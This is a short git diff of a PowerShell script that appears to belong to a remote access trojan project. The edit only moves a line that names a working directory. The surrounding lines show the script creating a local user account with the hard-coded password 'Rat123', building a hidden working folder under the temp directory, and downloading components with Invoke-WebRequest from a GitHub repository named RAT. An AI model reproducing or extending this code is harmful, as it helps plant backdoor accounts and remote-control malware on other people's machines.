@@ -30,6 +30,7 @@ $pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
 #goto temp and make working directory
+$wd = random_text
 $path = "$env:temp/$wd"
 mkdir $path
 cd $path
@@ -51,7 +52,7 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/co
 #mkdir $directory_name
 
 ## Variables
-$wd = random_text
+#$wd = random_text
 
 
 #$path = "$env:temp/$wd"
